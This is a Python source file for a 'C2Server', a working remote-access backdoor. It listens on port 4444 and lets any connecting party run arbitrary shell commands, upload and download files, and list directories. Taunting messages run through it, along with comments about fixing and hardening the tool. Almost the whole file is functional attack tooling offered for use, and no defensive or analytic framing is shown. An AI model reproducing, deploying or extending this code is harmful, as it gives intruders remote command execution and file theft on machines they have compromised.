import socket
import os
import subprocess
import threading
import struct
import sys

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] C2 Server listening on {self.host}:{self.port} 😈")

    def handle_client(self, client_socket):
        # --- Fix 3: Timeouts & Keep-Alive ---
        client_socket.settimeout(60.0)  # seconds
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        print(f"[*] New connection from {client_socket.getpeername()} 🤡")
        while True:
            try:
                command = client_socket.recv(1024).decode().strip()
                if not command:
                    break

                if command.lower() == "exit":
                    client_socket.send(b"Goodbye, you pathetic worm. 😈")
                    break

                elif command.lower() == "ping":   # --- Heartbeat ---
                    client_socket.send(b"PONG")

                elif command.lower() == "shell":
                    client_socket.send(b"[*] Entering shell mode. Type 'exit' to quit. 🐍")
                    while True:
                        shell_cmd = client_socket.recv(1024).decode().strip()
                        if shell_cmd.lower() == "exit":
                            break
                        try:
                            output = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT)
                            client_socket.send(output)
                        except Exception as e:
                            client_socket.send(f"Error: {str(e)}".encode())

                elif command.lower() == "upload":
                    client_socket.send(b"[*] Send file path to upload.")
                    file_path = client_socket.recv(1024).decode().strip()

                    # Tell client we're ready to receive the size header
                    client_socket.send(b"READY")

                    # --- Fix 2: Receive file size (8 bytes) ---
                    size_data = client_socket.recv(8)
                    if len(size_data) < 8:
                        client_socket.send(b"[!] Error: Invalid size header.")
                        continue
                    file_size = struct.unpack('!Q', size_data)[0]

                    # --- Fix 2: Proper error handling for upload ---
                    try:
                        # Prevent directory traversal (optional safety)
                        base_dir = os.getcwd()
                        abs_path = os.path.abspath(os.path.join(base_dir, file_path))
                        if not abs_path.startswith(base_dir):
                            client_socket.send(b"[!] Error: Path traversal not allowed.")
                            continue

                        with open(abs_path, 'wb') as f:
                            received = 0
                            while received < file_size:
                                chunk = client_socket.recv(min(4096, file_size - received))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received += len(chunk)
                            if received == file_size:
                                client_socket.send(b"[*] File uploaded successfully. 😈")
                            else:
                                client_socket.send(b"[!] Error: Transfer incomplete.")
                    except PermissionError:
                        client_socket.send(b"[!] Error: Permission denied.")
                    except FileNotFoundError:
                        client_socket.send(b"[!] Error: Invalid directory.")
                    except IsADirectoryError:
                        client_socket.send(b"[!] Error: Path is a directory.")
                    except Exception as e:
                        client_socket.send(f"[!] Error: {str(e)}".encode())

                elif command.lower() == "download":
                    client_socket.send(b"[*] Send file path to download.")
                    file_path = client_socket.recv(1024).decode().strip()

                    # --- Fix 2: Proper error handling for download ---
                    try:
                        base_dir = os.getcwd()
                        abs_path = os.path.abspath(os.path.join(base_dir, file_path))
                        if not abs_path.startswith(base_dir):
                            client_socket.send(struct.pack('!Q', 0))
                            client_socket.send(b"ERROR: Path traversal not allowed.")
                            continue

                        if not os.path.exists(abs_path):
                            client_socket.send(struct.pack('!Q', 0))
                            client_socket.send(b"ERROR: File not found.")
                            continue
                        if not os.path.isfile(abs_path):
                            client_socket.send(struct.pack('!Q', 0))
                            client_socket.send(b"ERROR: Path is a directory.")
                            continue

                        file_size = os.path.getsize(abs_path)
                        # Send size first
                        client_socket.send(struct.pack('!Q', file_size))
                        with open(abs_path, 'rb') as f:
                            sent = 0
                            while sent < file_size:
                                data = f.read(4096)
                                if not data:
                                    break
                                client_socket.send(data)
                                sent += len(data)
                    except Exception as e:
                        client_socket.send(struct.pack('!Q', 0))
                        client_socket.send(f"ERROR: {str(e)}".encode())

                elif command.lower() == "list":
                    try:
                        files = os.listdir()
                        client_socket.send(str(files).encode())
                    except Exception as e:
                        client_socket.send(f"[!] Error: {str(e)}".encode())

                else:
                    client_socket.send(b"[!] Unknown command. Try 'shell', 'upload', 'download', or 'list'. 🤡")

            except socket.timeout:
                print(f"[!] Timeout with {client_socket.getpeername()} – closing.")
                break
            except ConnectionResetError:
                print(f"[!] Connection reset by {client_socket.getpeername()}")
                break
            except Exception as e:
                print(f"[!] Error: {str(e)} 💀")
                break

        client_socket.close()
        print(f"[*] Connection closed with {client_socket.getpeername()} 🔥")

    def start(self):
        while True:
            client_socket, addr = self.server.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_thread.daemon = True
            client_thread.start()

if __name__ == "__main__":
    server = C2Server()
    server.start()
